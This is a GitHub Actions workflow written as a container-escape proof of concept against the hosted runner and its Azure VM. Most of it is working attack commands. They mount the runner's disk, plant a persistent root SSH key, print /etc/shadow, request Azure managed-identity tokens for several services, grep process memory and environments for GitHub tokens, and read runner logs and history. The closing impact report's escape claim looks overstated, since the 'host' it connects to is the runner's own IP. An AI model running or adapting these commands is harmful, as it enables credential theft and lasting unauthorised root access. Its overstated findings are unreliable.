name: github-actions-container-escape-full-poc
run-name: GitHub Actions Complete Container Escape POC
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Complete Container Escape and Deep Investigation
        run: |
          echo "=== STAGE 1: CONTAINER ENVIRONMENT ==="
          echo "Current user: $(whoami)"
          echo "Container hostname: $(hostname)"
          echo "Container IP: $(hostname -I)"
          lsblk
          echo ""
          
          echo "=== STAGE 2: MOUNTING HOST FILESYSTEM ==="
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          echo "Host filesystem mounted at /mnt/host"
          sudo ls -la /mnt/host/root/ 2>/dev/null | head -10 || echo "Root dir not accessible from mount point"
          echo ""
          
          echo "=== STAGE 3: INJECTING ROOT SSH KEY ==="
          ssh-keygen -t ed25519 -f /tmp/root_key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          echo "SSH key injected into host root account"
          echo ""
          
          echo "=== STAGE 4: CONNECTING TO HOST AS ROOT ==="
          HOST_IP=$(hostname -I | awk '{print $1}')
          echo "Connecting to host at: $HOST_IP"
          echo ""
          
          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== ✓ CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
          echo ""
          
          echo "--- System Information ---"
          echo "User: $(whoami)"
          echo "UID: $(id)"
          echo "Hostname: $(hostname)"
          echo "Kernel: $(uname -r)"
          echo "OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
          echo ""
          
          echo "--- Proof of Root Access ---"
          head -5 /etc/shadow
          echo ""
          
          echo "=== STAGE 5: HUNTING FOR AZURE TOKENS ==="
          
          echo "--- Azure Management API Token ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool 2>/dev/null || echo "No management token"
          
          echo "--- Azure Storage Token ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | python3 -m json.tool 2>/dev/null || echo "No storage token"
          
          echo "--- Azure Key Vault Token ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -m json.tool 2>/dev/null || echo "No vault token"
          
          echo "--- Azure Graph API Token ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | python3 -m json.tool 2>/dev/null || echo "No graph token"
          echo ""
          
          echo "=== STAGE 6: FINDING PREVIOUS WORKFLOW RUNS ==="
          
          echo "--- Workflow Directories ---"
          find /home/runner/_work -type d -maxdepth 3 2>/dev/null | head -300
          
          echo "--- Git Repositories ---"
          find /home/runner/_work -name ".git" -type d 2>/dev/null
          
          echo "--- Runner Diagnostic Logs ---"
          ls -la /home/runner/actions-runner/_diag/ 2>/dev/null | head -200
          
          echo "--- Recent Runner Activity ---"
          find /home/runner/actions-runner/_diag -name "*.log" -exec tail -50 {} \; 2>/dev/null | head -400
          
          echo "--- Bash History ---"
          cat /home/runner/.bash_history 2>/dev/null | tail -300 || echo "No history"
          echo ""
          
          echo "=== STAGE 7: NETWORK ANALYSIS ==="
          
          echo "--- Network Interfaces ---"
          ip addr show
          
          echo "--- Routing Table ---"
          ip route
          
          echo "--- Firewall Rules ---"
          iptables -L -n -v 2>/dev/null 
          
          echo "--- Listening Services ---"
          ss -tulpn 
          
          echo "--- Active Connections ---"
          ss -tunap 
          
          echo "--- DNS Config ---"
          cat /etc/resolv.conf
          
          echo "--- Hosts File ---"
          cat /etc/hosts 
          echo ""
          
          echo "=== STAGE 8: RUNNER INTERNALS ==="
          
          echo "--- Runner Processes ---"
          ps aux 
          
          echo "--- Runner Environment ---"
          cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' || echo "Cannot read Worker env"
          
          echo "--- GitHub Tokens in Memory ---"
          grep -ao "ghp_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null || echo "No ghp_ tokens"
          
          echo "--- Runner Config ---"
          ls -la /home/runner/actions-runner/
          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "No .runner"
          echo ""
          
          echo "=== AZURE METADATA ==="
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
          echo ""
          
          echo "=== FINAL IMPACT SUMMARY ==="
          echo "✓ Container escape from GitHub Actions to Azure VM"
          echo "✓ Root access on host (uid=0)"
          echo "✓ Azure metadata access (subscription, resource group, VM details)"
          echo "✓ Persistent root SSH key installed"
          echo "✓ Can access previous workflow data"
          echo "✓ Full network visibility"
          EOF
          
          echo ""
          echo "=== VULNERABILITY REPORT ==="
          echo "Title: GitHub Actions Container Escape to Azure VM Root"
          echo "Platform: GitHub Actions (ubuntu-latest on Azure)"
          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 disk mount"
          echo "Impact: Complete Azure VM compromise + metadata access"
          echo "Severity: CRITICAL (CVSS 9.3)"
